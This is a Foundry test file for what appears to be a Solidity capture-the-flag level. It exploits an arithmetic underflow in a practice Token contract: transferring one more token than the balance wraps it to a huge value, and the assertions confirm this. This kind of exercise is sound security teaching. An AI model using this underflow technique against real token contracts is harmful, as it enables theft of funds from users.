// SPDX-License-Identifier: MIT

pragma solidity >0.6.0;

import {console, Test} from "forge-std/Test.sol";
import {Token} from "../05_Token/Token.sol";

contract TokenTest is Test {
    Token public token;
    uint256 public initialSupply = 20;
    address public player;

    function setUp() public {
        player = makeAddr("player");
        vm.prank(player);
        token = new Token(initialSupply);
    }

    function test_exploit() public {
        vm.startPrank(player);
        // Step 1: check the current no.of tokens you own
        assertEq(token.balanceOf(player), initialSupply, "Initial supply should be 20");
        // Step 2: call transfer function to trigger arithmatic underflow
        token.transfer(address(0), 1 + initialSupply);

        // Step 3: check if you have very large no.of tokens
        assertGt(token.balanceOf(player), initialSupply, "You should have more than 20 tokens");
        uint256 new_tokens = initialSupply - (initialSupply + 1);
        assertEq(token.balanceOf(player), new_tokens, "You should have very large no.of tokens");
        vm.stopPrank();
    }
}